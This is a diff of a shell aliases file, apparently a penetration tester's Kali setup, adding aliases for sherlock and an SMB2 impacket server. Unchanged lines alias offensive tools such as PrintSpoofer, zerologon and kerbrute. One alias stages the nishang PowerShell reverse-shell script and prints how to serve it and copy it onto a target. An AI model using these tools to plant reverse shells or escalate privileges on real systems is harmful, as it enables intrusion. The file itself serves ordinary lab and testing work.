@@ -16,8 +16,8 @@ alias printspoofer='cp /opt/infosec-tools/printspoofer/PrintSpoofer.exe . && ech
 alias enum4linux-ng='/opt/infosec-tools/enum4linux-ng/enum4linux-ng.py'
 alias zerologon='/opt/infosec-tools/zerologon/zerologon.py'
 alias kerbrute='/opt/infosec-tools/kerbrute/kerbrute_linux_amd64'
-
 alias autorecon='sudo autorecon --only-scans-dir'
+alias sherlock='python3 /opt/infosec-tools/sherlock/sherlock'
 
 # Kali tools
 alias postman='/opt/PostmanCanary/PostmanCanary'
@@ -25,6 +25,7 @@ alias ssh2john='/usr/share/john/ssh2john.py'
 alias nishang-powershelltcp='cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 . && echo "Copied Invoke-PowerShellTcp.ps1 in current directory ($(pwd)/Invoke-PowerShellTcp.ps1). Host it with: impacket-smbserver kali . (aliased to smbup) - Download it on target with: copy \\\\$(ip a s tun0 | grep -w inet | cut -d" " -f6 | cut -d"/" -f1)\kali\Invoke-PowerShellTcp.ps1 .\Invoke-PowerShellTcp.ps1"'
 alias webup='python3 -m http.server 80'
 alias smbup='impacket-smbserver kali . '
+alias smb2up='impacket-smbserver -smb2support kali . '
 
 # pwntools
 PATH=$PATH:/home/custardsheit/.local/bin
